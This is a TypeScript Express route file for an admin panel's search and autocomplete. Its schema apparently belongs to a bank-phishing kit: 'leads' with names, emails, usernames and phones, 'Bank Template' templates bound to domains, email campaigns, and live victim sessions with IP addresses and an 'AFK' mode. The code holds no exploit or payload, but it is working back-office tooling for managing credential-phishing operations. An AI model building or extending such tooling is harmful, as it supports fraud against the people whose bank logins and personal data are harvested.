import express from 'express';
import { getDb } from '../database';
import { authenticateJWT } from '../middleware';

const router = express.Router();

interface SearchResult {
  id: number | string;
  type: 'lead' | 'template' | 'domain' | 'campaign' | 'session';
  title: string;
  subtitle?: string;
  description?: string;
  status?: string;
  created_at?: string;
  url?: string;
  metadata?: any;
}

// Global search endpoint
router.get('/', authenticateJWT, async (req, res) => {
  const { q: query, limit = 20, types } = req.query;

  if (!query || typeof query !== 'string' || query.trim().length < 2) {
    return res.json({ results: [], total: 0 });
  }

  try {
    const db = getDb();
    const searchTerm = query.trim();
    const searchPattern = `%${searchTerm}%`;
    const results: SearchResult[] = [];
    const maxPerType = Math.floor(parseInt(limit as string) / 4); // Distribute across types

    // Parse types filter
    const searchTypes = types ? (types as string).split(',') : ['lead', 'template', 'domain', 'campaign'];

    // 1. Search Leads (Protokolle)
    if (searchTypes.includes('lead')) {
      const leadResults = db.prepare(`
        SELECT 
          l.id,
          l.name,
          l.email,
          l.username,
          l.phone,
          l.status,
          l.created_at,
          l.tracking_id,
          t.name as template_display_name,
          t.folder_name as template_name,
          d.domain_name
        FROM leads l
        LEFT JOIN templates t ON l.template_id = t.id
        LEFT JOIN domains d ON l.domain_id = d.id
        WHERE (
          l.name LIKE ? OR 
          l.email LIKE ? OR 
          l.username LIKE ? OR 
          l.phone LIKE ? OR
          l.tracking_id LIKE ? OR
          t.name LIKE ? OR
          d.domain_name LIKE ?
        )
        ORDER BY l.created_at DESC
        LIMIT ?
      `).all(
        searchPattern, searchPattern, searchPattern, searchPattern, 
        searchPattern, searchPattern, searchPattern, maxPerType
      );

      leadResults.forEach((lead: any) => {
        const displayName = lead.name || lead.username || lead.email || `Lead #${lead.id}`;
        const subtitle = lead.template_display_name || lead.template_name || 'Unknown Template';
        
        results.push({
          id: lead.id,
          type: 'lead',
          title: displayName,
          subtitle: subtitle,
          description: `${lead.status} • ${lead.domain_name || 'No Domain'} • ${new Date(lead.created_at).toLocaleDateString('de-DE')}`,
          status: lead.status,
          created_at: lead.created_at,
          url: `/admin/leads/${lead.id}`,
          metadata: {
            email: lead.email,
            phone: lead.phone,
            username: lead.username,
            tracking_id: lead.tracking_id,
            template_name: lead.template_name,
            domain_name: lead.domain_name
          }
        });
      });
    }

    // 2. Search Templates
    if (searchTypes.includes('template')) {
      const templateResults = db.prepare(`
        SELECT 
          t.*,
          COUNT(l.id) as lead_count,
          COUNT(d.id) as domain_count
        FROM templates t
        LEFT JOIN leads l ON l.template_id = t.id
        LEFT JOIN domains d ON d.template_id = t.id
        WHERE (
          t.name LIKE ? OR 
          t.folder_name LIKE ? OR 
          t.description LIKE ?
        )
        GROUP BY t.id
        ORDER BY t.name
        LIMIT ?
      `).all(searchPattern, searchPattern, searchPattern, maxPerType);

      templateResults.forEach((template: any) => {
        results.push({
          id: template.id,
          type: 'template',
          title: template.name,
          subtitle: template.folder_name,
          description: `${template.lead_count} Protokolle • ${template.domain_count} Domains • ${template.template_type || 'Bank Template'}`,
          status: template.is_active ? 'active' : 'inactive',
          created_at: template.created_at,
          url: `/admin/templates/${template.id}`,
          metadata: {
            folder_name: template.folder_name,
            template_type: template.template_type,
            description: template.description,
            lead_count: template.lead_count,
            domain_count: template.domain_count
          }
        });
      });
    }

    // 3. Search Domains
    if (searchTypes.includes('domain')) {
      const domainResults = db.prepare(`
        SELECT 
          d.*,
          t.name as template_display_name,
          t.folder_name as template_name,
          COUNT(l.id) as lead_count
        FROM domains d
        LEFT JOIN templates t ON d.template_id = t.id
        LEFT JOIN leads l ON l.domain_id = d.id
        WHERE (
          d.domain_name LIKE ? OR
          t.name LIKE ? OR
          t.folder_name LIKE ?
        )
        GROUP BY d.id
        ORDER BY d.domain_name
        LIMIT ?
      `).all(searchPattern, searchPattern, searchPattern, maxPerType);

      domainResults.forEach((domain: any) => {
        results.push({
          id: domain.id,
          type: 'domain',
          title: domain.domain_name,
          subtitle: domain.template_display_name || domain.template_name,
          description: `${domain.lead_count} Protokolle • ${domain.is_active ? 'Aktiv' : 'Inaktiv'}`,
          status: domain.is_active ? 'active' : 'inactive',
          created_at: domain.created_at,
          url: `/admin/domains/${domain.id}`,
          metadata: {
            template_name: domain.template_name,
            template_display_name: domain.template_display_name,
            lead_count: domain.lead_count,
            is_active: domain.is_active
          }
        });
      });
    }

    // 4. Search Campaigns
    if (searchTypes.includes('campaign')) {
      const campaignResults = db.prepare(`
        SELECT 
          c.*,
          u.username as created_by_username,
          (SELECT COUNT(*) FROM campaign_recipients cr WHERE cr.campaign_id = c.id) as recipient_count
        FROM campaigns c
        LEFT JOIN users u ON c.created_by = u.id
        WHERE (
          c.name LIKE ? OR 
          c.subject LIKE ? OR 
          c.description LIKE ?
        )
        ORDER BY c.created_at DESC
        LIMIT ?
      `).all(searchPattern, searchPattern, searchPattern, maxPerType);

      campaignResults.forEach((campaign: any) => {
        results.push({
          id: campaign.id,
          type: 'campaign',
          title: campaign.name,
          subtitle: campaign.subject,
          description: `${campaign.recipient_count} Empfänger • ${campaign.status} • ${campaign.created_by_username || 'System'}`,
          status: campaign.status,
          created_at: campaign.created_at,
          url: `/admin/campaigns/${campaign.id}`,
          metadata: {
            subject: campaign.subject,
            description: campaign.description,
            recipient_count: campaign.recipient_count,
            created_by: campaign.created_by_username,
            schedule_time: campaign.schedule_time
          }
        });
      });
    }

    // 5. Search Active Sessions (if requested)
    if (searchTypes.includes('session')) {
      const sessionResults = db.prepare(`
        SELECT 
          s.*,
          t.name as template_display_name,
          t.folder_name as template_name
        FROM sessions s
        LEFT JOIN templates t ON t.folder_name = s.template_name
        WHERE (
          s.session_key LIKE ? OR
          s.template_name LIKE ? OR
          s.current_state LIKE ? OR
          s.ip_address LIKE ? OR
          t.name LIKE ?
        )
        AND s.expires_at > datetime('now')
        ORDER BY s.updated_at DESC
        LIMIT ?
      `).all(
        searchPattern, searchPattern, searchPattern, searchPattern, 
        searchPattern, maxPerType
      );

      sessionResults.forEach((session: any) => {
        const sessionKey = session.session_key.substring(0, 16) + '...';
        results.push({
          id: session.session_key,
          type: 'session',
          title: `Session ${sessionKey}`,
          subtitle: session.template_display_name || session.template_name,
          description: `${session.current_state} • ${session.session_mode || 'AFK'} • ${session.is_completed ? 'Abgeschlossen' : 'Aktiv'}`,
          status: session.is_completed ? 'completed' : 'active',
          created_at: session.created_at,
          url: `/admin/sessions/${session.session_key}`,
          metadata: {
            template_name: session.template_name,
            current_state: session.current_state,
            session_mode: session.session_mode,
            is_completed: session.is_completed,
            ip_address: session.ip_address
          }
        });
      });
    }

    // Sort results by relevance (exact matches first, then by date)
    results.sort((a, b) => {
      const aExact = a.title.toLowerCase().includes(searchTerm.toLowerCase()) ? 1 : 0;
      const bExact = b.title.toLowerCase().includes(searchTerm.toLowerCase()) ? 1 : 0;
      
      if (aExact !== bExact) {
        return bExact - aExact; // Exact matches first
      }
      
      // Then sort by date (newest first)
      if (a.created_at && b.created_at) {
        return new Date(b.created_at).getTime() - new Date(a.created_at).getTime();
      }
      
      return 0;
    });

    // Group results by type for better UX
    const groupedResults = {
      leads: results.filter(r => r.type === 'lead'),
      templates: results.filter(r => r.type === 'template'),
      domains: results.filter(r => r.type === 'domain'),
      campaigns: results.filter(r => r.type === 'campaign'),
      sessions: results.filter(r => r.type === 'session')
    };

    res.json({
      results,
      grouped: groupedResults,
      total: results.length,
      query: searchTerm,
      types: searchTypes
    });

  } catch (error) {
    console.error('Global search error:', error);
    res.status(500).json({ 
      error: 'Search failed',
      results: [],
      total: 0 
    });
  }
});

// Quick search suggestions endpoint (for autocomplete)
router.get('/suggestions', authenticateJWT, async (req, res) => {
  const { q: query } = req.query;

  if (!query || typeof query !== 'string' || query.trim().length < 1) {
    return res.json({ suggestions: [] });
  }

  try {
    const db = getDb();
    const searchTerm = query.trim();
    const searchPattern = `%${searchTerm}%`;
    const suggestions: string[] = [];

    // Get unique suggestions from different sources
    const leadSuggestions = db.prepare(`
      SELECT DISTINCT 
        CASE 
          WHEN l.name IS NOT NULL AND l.name != '' THEN l.name
          WHEN l.username IS NOT NULL AND l.username != '' THEN l.username
          WHEN l.email IS NOT NULL AND l.email != '' THEN l.email
          ELSE NULL
        END as suggestion
      FROM leads l
      WHERE suggestion IS NOT NULL AND suggestion LIKE ?
      LIMIT 5
    `).all(searchPattern);

    const templateSuggestions = db.prepare(`
      SELECT DISTINCT name as suggestion FROM templates 
      WHERE name LIKE ?
      LIMIT 3
    `).all(searchPattern);

    const domainSuggestions = db.prepare(`
      SELECT DISTINCT domain_name as suggestion FROM domains 
      WHERE domain_name LIKE ?
      LIMIT 3
    `).all(searchPattern);

    // Combine and deduplicate suggestions
    [...leadSuggestions, ...templateSuggestions, ...domainSuggestions]
      .forEach((item: any) => {
        if (item.suggestion && !suggestions.includes(item.suggestion)) {
          suggestions.push(item.suggestion);
        }
      });

    res.json({ 
      suggestions: suggestions.slice(0, 8), // Max 8 suggestions
      query: searchTerm 
    });

  } catch (error) {
    console.error('Search suggestions error:', error);
    res.json({ suggestions: [] });
  }
});

export default router;
